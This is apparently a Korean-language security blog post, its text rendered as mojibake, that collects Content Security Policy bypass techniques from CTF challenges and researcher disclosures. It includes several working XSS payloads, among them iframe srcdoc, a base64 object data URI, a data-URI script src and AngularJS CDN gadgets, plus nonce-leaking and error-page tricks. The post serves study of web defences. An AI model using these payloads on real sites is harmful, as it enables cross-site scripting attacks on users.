---
title: "CSP Bypass ê¸°ë²• ì •ë¦¬"
description: "Content Security Policy(CSP) ìš°íšŒ ê¸°ë²• ëª¨ìŒ - CTF ë¬¸ì œ í’€ì´ ê¸°ë°˜"
date: 2020-02-15
tags: ["web-security", "csp", "bypass", "xss"]
category: "Security Research"
published: true
---

# CSP Bypass ê¸°ë²• ì •ë¦¬

Codegate 2020 CSP ë¬¸ì œ í’€ë‹¤ê°€ ê´€ë ¨ ìš°íšŒê¸°ë²• ì •ë¦¬í•´ì•¼ê² ë‹¤ ì‹¶ì–´ì„œ ëŒ€ì¶© ì •ë¦¬í•´ì„œ ì˜¬ë ¤ë´…ë‹ˆë‹¤.
ì¶”ê°€ë¡œ ì•Œê²Œë˜ëŠ” ì •ë³´ê°€ ìˆìœ¼ë©´ ì—…ë°ì´íŠ¸ í• ê²Œìš”~~


## ğŸ“¸ ì›ë³¸ ì´ë¯¸ì§€

![Image 1](/images/posts/csp-bypass-techniques_6ac0a7e5.jpg)


## CTFZone 2019 - Script nonce : Cache Poisoning

- `/index.php/` ë“±ì„ ì´ìš©í•´ cache poisoning í•˜ì—¬ CSP script nonceë¥¼ ê³ ì •

## Codegate 2020

### Script nonce : Header Injection - Status Code 102

- Status Code 102 ì¼ë•ŒëŠ” CSPê°€ ë™ì‘í•˜ì§€ ì•ŠëŠ”ì ì„ ì´ìš©
- `header("HTTP/: 102");`

### Script nonce : CSS Injection

- CSS injectionì˜ ì •ê·œí‘œí˜„ì‹ìœ¼ë¡œ attributeì— ì ‘ê·¼ í•  ìˆ˜ ìˆëŠ” ê²ƒì„ ì´ìš©, í•œê¸€ìì”© searching í•´ì„œ script nonceë¥¼ ê°€ì ¸ì˜´

**ì°¸ê³  ë§í¬:**
- https://lbherrera.me/solver.html
- http://sirdarckcat.blogspot.com/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html

## Chromium 74 dev - Import Maps CSP Bypass

**ì°¸ê³  ë§í¬:**
- https://bugs.chromium.org/p/chromium/issues/detail?id=941340
- https://test.shhnjk.com/imap.php

## Chromium 78 (by @shhnjk)

```html
<iframe srcdoc="<script>alert(origin);window.stop()</script><meta http-equiv=refresh content='0;url=https://shhnjk.azurewebsites.net/csp_srcdoc.html'>"></iframe>
```

## Object Data CSP Bypass (by @shhnjk)

```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

## Script Src Bypass (by @akita_zen)

```html
<script ?/src="data:+,\u0061lert%281%29">/</script>
```

(by @404death)

## ë™ì¼ ë° ì‹ ë¢° ë„ë©”ì¸ì—ì„œ ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰

`script-src 'self'` ë˜ëŠ” `script-src 'a.com'` ì¸ ê²½ìš°

### Same or Trusted domain

- `script-src 'self' unsafe-inline`
- nginx 400 error, favicon.ico / robots.txt ë“±ì˜ 404 í˜ì´ì§€ë¥¼ ì„ë² ë”©í•´ì„œ ìŠ¤í¬ë¦½íŠ¸ ì‚½ì… ê°€ëŠ¥
- Request URI Too Big ì—ëŸ¬ë„ í™œìš© ê°€ëŠ¥
- Cookie max size ì—ëŸ¬ë„ í™œìš© ê°€ëŠ¥

**ì°¸ê³ :** https://www.slideshare.net/ssusera0a306/volgactf-2018-neatly-bypassing-csp

## Click Jacking / Dangling Markup

CSP bypass (ë¼ê¸°ë³´ë‹¨ dom code ë‚´ ì¤‘ìš”ì •ë³´ íƒˆì·¨ì¯¤ ë ë“¯)

**ì°¸ê³ :** http://portswigger-labs.net/dangling_markup/

## Angular JS CDNì„ ì´ìš©í•œ CSP Bypass

```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26 ..
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax ...
```

etc...
